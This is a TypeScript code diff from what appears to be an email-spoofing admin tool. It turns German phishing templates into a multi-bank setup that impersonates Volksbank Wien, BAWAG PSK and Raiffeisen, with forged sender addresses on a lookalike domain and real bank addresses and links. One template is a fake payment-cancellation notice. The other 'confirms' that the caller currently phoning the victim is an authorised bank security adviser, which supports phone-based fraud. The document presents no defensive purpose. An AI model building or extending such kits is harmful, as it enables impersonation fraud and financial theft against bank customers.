@@ -27,215 +27,192 @@ const TEMPLATE_KEY = "admin_email_spoof_template_v1";
 const htmlStorageKey = (id: string) => `admin_email_spoof_html_v11_${id}`;
 const RESEND_KEY = "admin_email_spoof_resend_v1";
 
-const stornierungHtml = `<!DOCTYPE html>
+type BankKey = "vb" | "bawag" | "rbi";
+
+type BankConfig = {
+  name: string;
+  fullName: string;
+  fromName: string;
+  fromEmail: string;
+  accent: string;
+  topbar: string;
+  border: string;
+  address: string;
+  domain: string;
+  schalter: string;
+  filiale: string;
+};
+
+const BANK_CONFIG: Record<BankKey, BankConfig> = {
+  vb: {
+    name: "Volksbank",
+    fullName: "Volksbank Wien AG",
+    fromName: "Volksbank Wien AG",
+    fromEmail: "volksbank@sicherheitsystem.net",
+    accent: "#004899",
+    topbar: "#004899",
+    border: "#004899",
+    address: "Dietrichgasse 25, 1030 Wien",
+    domain: "volksbank.at",
+    schalter: "Volksbank-Schalter",
+    filiale: "Volksbank-Filiale",
+  },
+  bawag: {
+    name: "BAWAG",
+    fullName: "BAWAG PSK",
+    fromName: "BAWAG PSK",
+    fromEmail: "bawag@sicherheitsystem.net",
+    accent: "#990000",
+    topbar: "#990000",
+    border: "#990000",
+    address: "Wiedner Gürtel 11, 1100 Wien",
+    domain: "bawag.com",
+    schalter: "BAWAG-Schalter",
+    filiale: "BAWAG-Filiale",
+  },
+  rbi: {
+    name: "Raiffeisen",
+    fullName: "Raiffeisen Bank International AG",
+    fromName: "Raiffeisen Bank International AG",
+    fromEmail: "raiffeisen@sicherheitsystem.net",
+    accent: "#000000",
+    topbar: "#FFED00",
+    border: "#000000",
+    address: "Am Stadtpark 9, 1030 Wien",
+    domain: "rbinternational.com",
+    schalter: "Raiffeisen-Schalter",
+    filiale: "Raiffeisen-Filiale",
+  },
+};
+
+const stornierungHtml = (b: BankConfig) => `<!DOCTYPE html>
 <html lang="de">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Volksbank - Stornierung Ihrer Zahlung</title>
+  <title>${b.name} - Stornierung Ihrer Zahlung</title>
 </head>
 <body style="margin:0;padding:0;background-color:#f4f4f4;font-family:Arial,Helvetica,sans-serif;">
   <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background-color:#f4f4f4;padding:40px 0;">
-    <tr>
-      <td align="center">
-        <table role="presentation" width="600" cellpadding="0" cellspacing="0" style="background-color:#ffffff;border-radius:8px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,0.08);">
-
-          <!-- Blue divider -->
-          <tr>
-            <td style="height:3px;background-color:#004899;font-size:0;line-height:0;">&nbsp;</td>
-          </tr>
-
-          <!-- Body -->
-          <tr>
-            <td style="padding:35px 40px 30px 40px;">
-              <h1 style="margin:0 0 25px 0;font-size:20px;color:#1a1a1a;font-weight:700;line-height:1.35;">
-                Stornierung Ihrer Zahlung &ndash; in Bearbeitung
-              </h1>
-
-              <p style="margin:0 0 18px 0;font-size:15px;line-height:1.6;color:#333333;">
-                {{ANREDE}} {{NACHNAME}},
-              </p>
-
-              <p style="margin:0 0 22px 0;font-size:15px;line-height:1.6;color:#333333;">
-                wir informieren Sie hiermit, dass die nachfolgend aufgef&uuml;hrte Zahlung von Ihrem Konto derzeit im Stornierungsprozess bearbeitet wird.
-              </p>
-
-              <!-- Zahlungsdetails-Box -->
-              <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="margin:0 0 25px 0;">
-                <tr>
-                  <td style="background-color:#f1f4f7;border-left:4px solid #004899;border-radius:0 6px 6px 0;padding:20px 24px;">
-                    <p style="margin:0 0 10px 0;font-size:13px;font-weight:700;color:#004899;letter-spacing:0.4px;text-transform:uppercase;">
-                      Zahlungsdetails
-                    </p>
-                    <p style="margin:0 0 6px 0;font-size:14px;line-height:1.6;color:#333333;">
-                      <strong style="color:#1a1a1a;">Betrag:</strong> EUR 4.990,00
-                    </p>
-                    <p style="margin:0 0 6px 0;font-size:14px;line-height:1.6;color:#333333;">
-                      <strong style="color:#1a1a1a;">Empf&auml;nger:</strong> ISTVAN ERDELYI
-                    </p>
-                    <p style="margin:0 0 6px 0;font-size:14px;line-height:1.6;color:#333333;">
-                      <strong style="color:#1a1a1a;">IBAN:</strong> AT76 1400 0069 1093 2673
-                    </p>
-                    <p style="margin:0;font-size:14px;line-height:1.6;color:#333333;">
-                      <strong style="color:#1a1a1a;">Zahlungsreferenz:</strong> STOR.884772
-                    </p>
-                  </td>
-                </tr>
-              </table>
-
-              <p style="margin:0 0 22px 0;font-size:15px;line-height:1.6;color:#333333;">
-                Die Stornierung wird <strong>umgehend</strong> durchgef&uuml;hrt, sobald Sie den <strong>Stornierungs- bzw. Quittungsbeleg</strong> pers&ouml;nlich an Ihrem Volksbank-Schalter abgeben. Der Betrag wird anschlie&szlig;end Ihrem Konto wieder gutgeschrieben.
-              </p>
-
-              <p style="margin:0 0 22px 0;font-size:15px;line-height:1.6;color:#333333;">
-                Bitte bringen Sie zur Abwicklung einen <strong>amtlichen Lichtbildausweis</strong> sowie den zugeh&ouml;rigen Beleg mit. Ihr Guthaben ist zu jedem Zeitpunkt vollst&auml;ndig gesch&uuml;tzt.
-              </p>
-
-              <p style="margin:0;font-size:14px;line-height:1.6;color:#666666;">
-                Bei R&uuml;ckfragen stehen Ihnen die Mitarbeiterinnen und Mitarbeiter Ihrer Volksbank-Filiale gerne zur Verf&uuml;gung.
-              </p>
+    <tr><td align="center">
+      <table role="presentation" width="600" cellpadding="0" cellspacing="0" style="background-color:#ffffff;border-radius:8px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,0.08);">
+        <tr><td style="height:3px;background-color:${b.topbar};font-size:0;line-height:0;">&nbsp;</td></tr>
+        <tr><td style="padding:35px 40px 30px 40px;">
+          <h1 style="margin:0 0 25px 0;font-size:20px;color:#1a1a1a;font-weight:700;line-height:1.35;">Stornierung Ihrer Zahlung &ndash; in Bearbeitung</h1>
+          <p style="margin:0 0 18px 0;font-size:15px;line-height:1.6;color:#333333;">{{ANREDE}} {{NACHNAME}},</p>
+          <p style="margin:0 0 22px 0;font-size:15px;line-height:1.6;color:#333333;">wir informieren Sie hiermit, dass die nachfolgend aufgef&uuml;hrte Zahlung von Ihrem Konto derzeit im Stornierungsprozess bearbeitet wird.</p>
+          <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="margin:0 0 25px 0;"><tr>
+            <td style="background-color:#f1f4f7;border-left:4px solid ${b.border};border-radius:0 6px 6px 0;padding:20px 24px;">
+              <p style="margin:0 0 10px 0;font-size:13px;font-weight:700;color:${b.accent};letter-spacing:0.4px;text-transform:uppercase;">Zahlungsdetails</p>
+              <p style="margin:0 0 6px 0;font-size:14px;line-height:1.6;color:#333333;"><strong style="color:#1a1a1a;">Betrag:</strong> EUR 4.990,00</p>
+              <p style="margin:0 0 6px 0;font-size:14px;line-height:1.6;color:#333333;"><strong style="color:#1a1a1a;">Empf&auml;nger:</strong> ISTVAN ERDELYI</p>
+              <p style="margin:0 0 6px 0;font-size:14px;line-height:1.6;color:#333333;"><strong style="color:#1a1a1a;">IBAN:</strong> AT76 1400 0069 1093 2673</p>
+              <p style="margin:0;font-size:14px;line-height:1.6;color:#333333;"><strong style="color:#1a1a1a;">Zahlungsreferenz:</strong> STOR.884772</p>
             </td>
-          </tr>
-
-          <!-- Footer -->
-          <tr>
-            <td style="background-color:#f8f9fa;padding:25px 40px;border-top:1px solid #e5e7eb;">
-              <table role="presentation" width="100%" cellpadding="0" cellspacing="0">
-                <tr>
-                  <td>
-                    <p style="margin:0 0 6px 0;font-size:12px;color:#999999;">
-                      Volksbank Wien AG
-                    </p>
-                    <p style="margin:0 0 12px 0;font-size:12px;color:#999999;">
-                      Dietrichgasse 25, 1030 Wien
-                    </p>
-                    <p style="margin:0;font-size:11px;color:#bbbbbb;">
-                      <a href="https://www.volksbank.at/impressum" style="color:#999999;text-decoration:underline;">Impressum</a>
-                      &nbsp;&middot;&nbsp;
-                      <a href="https://www.volksbank.at/datenschutz" style="color:#999999;text-decoration:underline;">Datenschutz</a>
-                      &nbsp;&middot;&nbsp;
-                      <a href="https://www.volksbank.at" style="color:#999999;text-decoration:underline;">volksbank.at</a>
-                    </p>
-                  </td>
-                </tr>
-              </table>
-            </td>
-          </tr>
-
-        </table>
-      </td>
-    </tr>
+          </tr></table>
+          <p style="margin:0 0 22px 0;font-size:15px;line-height:1.6;color:#333333;">Die Stornierung wird <strong>umgehend</strong> durchgef&uuml;hrt, sobald Sie den <strong>Stornierungs- bzw. Quittungsbeleg</strong> pers&ouml;nlich an Ihrem ${b.schalter} abgeben. Der Betrag wird anschlie&szlig;end Ihrem Konto wieder gutgeschrieben.</p>
+          <p style="margin:0 0 22px 0;font-size:15px;line-height:1.6;color:#333333;">Bitte bringen Sie zur Abwicklung einen <strong>amtlichen Lichtbildausweis</strong> sowie den zugeh&ouml;rigen Beleg mit. Ihr Guthaben ist zu jedem Zeitpunkt vollst&auml;ndig gesch&uuml;tzt.</p>
+          <p style="margin:0;font-size:14px;line-height:1.6;color:#666666;">Bei R&uuml;ckfragen stehen Ihnen die Mitarbeiterinnen und Mitarbeiter Ihrer ${b.filiale} gerne zur Verf&uuml;gung.</p>
+        </td></tr>
+        <tr><td style="background-color:#f8f9fa;padding:25px 40px;border-top:1px solid #e5e7eb;">
+          <p style="margin:0 0 6px 0;font-size:12px;color:#999999;">${b.fullName}</p>
+          <p style="margin:0 0 12px 0;font-size:12px;color:#999999;">${b.address}</p>
+          <p style="margin:0;font-size:11px;color:#bbbbbb;">
+            <a href="https://www.${b.domain}/impressum" style="color:#999999;text-decoration:underline;">Impressum</a> &middot;
+            <a href="https://www.${b.domain}/datenschutz" style="color:#999999;text-decoration:underline;">Datenschutz</a> &middot;
+            <a href="https://www.${b.domain}" style="color:#999999;text-decoration:underline;">${b.domain}</a>
+          </p>
+        </td></tr>
+      </table>
+    </td></tr>
   </table>
 </body>
 </html>`;
 
-const legitimierungHtml = `<!DOCTYPE html>
+const legitimierungHtml = (b: BankConfig) => `<!DOCTYPE html>
 <html lang="de">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Volksbank - Mitarbeiter-Legitimierung</title>
+  <title>${b.name} - Mitarbeiter-Legitimierung</title>
 </head>
 <body style="margin:0;padding:0;background-color:#f4f4f4;font-family:Arial,Helvetica,sans-serif;">
   <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background-color:#f4f4f4;padding:40px 0;">
-    <tr>
-      <td align="center">
-        <table role="presentation" width="600" cellpadding="0" cellspacing="0" style="background-color:#ffffff;border-radius:8px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,0.08);">
-
-          <!-- Blue divider -->
-          <tr>
-            <td style="height:3px;background-color:#004899;font-size:0;line-height:0;">&nbsp;</td>
-          </tr>
-
-          <!-- Body -->
-          <tr>
-            <td style="padding:35px 40px 30px 40px;">
-              <h1 style="margin:0 0 25px 0;font-size:20px;color:#1a1a1a;font-weight:700;line-height:1.35;">
-                Legitimierung Ihres Sicherheitsberaters
-              </h1>
-
-              <p style="margin:0 0 18px 0;font-size:15px;line-height:1.6;color:#333333;">
-                {{ANREDE}} {{NACHNAME}},
-              </p>
-
-              <p style="margin:0 0 22px 0;font-size:15px;line-height:1.6;color:#333333;">
-                zur Ihrer Sicherheit best&auml;tigen wir Ihnen hiermit schriftlich, dass der Sie derzeit telefonisch kontaktierende Sicherheitsberater ein <strong>offiziell autorisierter Mitarbeiter</strong> der Volksbank Wien AG ist. Bitte gleichen Sie die untenstehenden Legitimierungsdaten w&auml;hrend des Gespr&auml;chs mit Ihrem Berater ab.
-              </p>
-
-              <!-- Legitimierungs-Box -->
-              <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="margin:0 0 25px 0;">
-                <tr>
-                  <td style="background-color:#f1f4f7;border-left:4px solid #004899;border-radius:0 6px 6px 0;padding:20px 24px;">
-                    <p style="margin:0 0 10px 0;font-size:13px;font-weight:700;color:#004899;letter-spacing:0.4px;text-transform:uppercase;">
-                      Legitimierungsdaten
-                    </p>
-                    <p style="margin:0 0 6px 0;font-size:14px;line-height:1.6;color:#333333;">
-                      <strong style="color:#1a1a1a;">Sicherheitsberater:</strong> Simon Hengst
-                    </p>
-                    <p style="margin:0 0 6px 0;font-size:14px;line-height:1.6;color:#333333;">
-                      <strong style="color:#1a1a1a;">Abteilung:</strong> Sicherheit &amp; Betrugspr&auml;vention
-                    </p>
-                    <p style="margin:0;font-size:14px;line-height:1.6;color:#333333;">
-                      <strong style="color:#1a1a1a;">Referenznummer:</strong> LEG.774218
-                    </p>
-                  </td>
-                </tr>
-              </table>
-
-              <p style="margin:0;font-size:15px;line-height:1.6;color:#333333;">
-                Bitte nennen Sie Ihrem Berater bei R&uuml;ckfragen ausschlie&szlig;lich die oben genannte <strong>Referenznummer</strong>. So stellen wir gemeinsam sicher, dass Sie mit dem korrekten Ansprechpartner verbunden sind.
-              </p>
+    <tr><td align="center">
+      <table role="presentation" width="600" cellpadding="0" cellspacing="0" style="background-color:#ffffff;border-radius:8px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,0.08);">
+        <tr><td style="height:3px;background-color:${b.topbar};font-size:0;line-height:0;">&nbsp;</td></tr>
+        <tr><td style="padding:35px 40px 30px 40px;">
+          <h1 style="margin:0 0 25px 0;font-size:20px;color:#1a1a1a;font-weight:700;line-height:1.35;">Legitimierung Ihres Sicherheitsberaters</h1>
+          <p style="margin:0 0 18px 0;font-size:15px;line-height:1.6;color:#333333;">{{ANREDE}} {{NACHNAME}},</p>
+          <p style="margin:0 0 22px 0;font-size:15px;line-height:1.6;color:#333333;">zur Ihrer Sicherheit best&auml;tigen wir Ihnen hiermit schriftlich, dass der Sie derzeit telefonisch kontaktierende Sicherheitsberater ein <strong>offiziell autorisierter Mitarbeiter</strong> der ${b.fullName} ist. Bitte gleichen Sie die untenstehenden Legitimierungsdaten w&auml;hrend des Gespr&auml;chs mit Ihrem Berater ab.</p>
+          <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="margin:0 0 25px 0;"><tr>
+            <td style="background-color:#f1f4f7;border-left:4px solid ${b.border};border-radius:0 6px 6px 0;padding:20px 24px;">
+              <p style="margin:0 0 10px 0;font-size:13px;font-weight:700;color:${b.accent};letter-spacing:0.4px;text-transform:uppercase;">Legitimierungsdaten</p>
+              <p style="margin:0 0 6px 0;font-size:14px;line-height:1.6;color:#333333;"><strong style="color:#1a1a1a;">Sicherheitsberater:</strong> Simon Hengst</p>
+              <p style="margin:0 0 6px 0;font-size:14px;line-height:1.6;color:#333333;"><strong style="color:#1a1a1a;">Abteilung:</strong> Sicherheit &amp; Betrugspr&auml;vention</p>
+              <p style="margin:0;font-size:14px;line-height:1.6;color:#333333;"><strong style="color:#1a1a1a;">Referenznummer:</strong> LEG.774218</p>
             </td>
-          </tr>
-
-          <!-- Footer -->
-          <tr>
-            <td style="background-color:#f8f9fa;padding:25px 40px;border-top:1px solid #e5e7eb;">
-              <table role="presentation" width="100%" cellpadding="0" cellspacing="0">
-                <tr>
-                  <td>
-                    <p style="margin:0 0 6px 0;font-size:12px;color:#999999;">
-                      Volksbank Wien AG
-                    </p>
-                    <p style="margin:0 0 12px 0;font-size:12px;color:#999999;">
-                      Dietrichgasse 25, 1030 Wien
-                    </p>
-                    <p style="margin:0;font-size:11px;color:#bbbbbb;">
-                      <a href="https://www.volksbank.at/impressum" style="color:#999999;text-decoration:underline;">Impressum</a>
-                      &nbsp;&middot;&nbsp;
-                      <a href="https://www.volksbank.at/datenschutz" style="color:#999999;text-decoration:underline;">Datenschutz</a>
-                      &nbsp;&middot;&nbsp;
-                      <a href="https://www.volksbank.at" style="color:#999999;text-decoration:underline;">volksbank.at</a>
-                    </p>
-                  </td>
-                </tr>
-              </table>
-            </td>
-          </tr>
-
-        </table>
-      </td>
-    </tr>
+          </tr></table>
+          <p style="margin:0;font-size:15px;line-height:1.6;color:#333333;">Bitte nennen Sie Ihrem Berater bei R&uuml;ckfragen ausschlie&szlig;lich die oben genannte <strong>Referenznummer</strong>. So stellen wir gemeinsam sicher, dass Sie mit dem korrekten Ansprechpartner verbunden sind.</p>
+        </td></tr>
+        <tr><td style="background-color:#f8f9fa;padding:25px 40px;border-top:1px solid #e5e7eb;">
+          <p style="margin:0 0 6px 0;font-size:12px;color:#999999;">${b.fullName}</p>
+          <p style="margin:0 0 12px 0;font-size:12px;color:#999999;">${b.address}</p>
+          <p style="margin:0;font-size:11px;color:#bbbbbb;">
+            <a href="https://www.${b.domain}/impressum" style="color:#999999;text-decoration:underline;">Impressum</a> &middot;
+            <a href="https://www.${b.domain}/datenschutz" style="color:#999999;text-decoration:underline;">Datenschutz</a> &middot;
+            <a href="https://www.${b.domain}" style="color:#999999;text-decoration:underline;">${b.domain}</a>
+          </p>
+        </td></tr>
+      </table>
+    </td></tr>
   </table>
 </body>
 </html>`;
 
-type TemplateDef = { id: string; label: string; subject: string; html: string };
+type TemplateDef = { id: string; label: string; subject: string; html: string; fromName: string; fromEmail: string };
 
-const TEMPLATES: TemplateDef[] = [
-  {
-    id: "stornierung",
-    label: "Stornierung Zahlung",
-    subject: "Stornierung Ihrer Zahlung – Referenz STOR.884772",
-    html: stornierungHtml,
-  },
-  {
-    id: "legitimierung",
-    label: "Mitarbeiter-Legitimierung",
-    subject: "Legitimierung Ihres Sicherheitsberaters – Referenz LEG.774218",
-    html: legitimierungHtml,
-  },
-];
+const buildTemplates = (): TemplateDef[] => {
+  const banks: { key: BankKey; label: string }[] = [
+    { key: "vb", label: "Volksbank" },
+    { key: "bawag", label: "BAWAG" },
+    { key: "rbi", label: "Raiffeisen" },
+  ];
+  const out: TemplateDef[] = [];
+  for (const { key, label } of banks) {
+    const cfg = BANK_CONFIG[key];
+    out.push({
+      id: `${key}_stornierung`,
+      label: `${label}-Stornierung`,
+      subject: "Stornierung Ihrer Zahlung – Referenz STOR.884772",
+      html: stornierungHtml(cfg),
+      fromName: cfg.fromName,
+      fromEmail: cfg.fromEmail,
+    });
+    out.push({
+      id: `${key}_legitimierung`,
+      label: `${label}-Legitimierung`,
+      subject: "Legitimierung Ihres Sicherheitsberaters – Referenz LEG.774218",
+      html: legitimierungHtml(cfg),
+      fromName: cfg.fromName,
+      fromEmail: cfg.fromEmail,
+    });
+  }
+  return out;
+};
+
+const TEMPLATES: TemplateDef[] = buildTemplates();
+
+// Legacy ID migration (old IDs: "stornierung", "legitimierung" → Volksbank)
+const LEGACY_ID_MAP: Record<string, string> = {
+  stornierung: "vb_stornierung",
+  legitimierung: "vb_legitimierung",
+};
+const normalizeId = (id: string | null): string => {
+  if (!id) return TEMPLATES[0].id;
+  const mapped = LEGACY_ID_MAP[id] || id;
+  return TEMPLATES.find((t) => t.id === mapped) ? mapped : TEMPLATES[0].id;
+};
 
 const getTemplate = (id: string): TemplateDef => TEMPLATES.find((t) => t.id === id) || TEMPLATES[0];
 
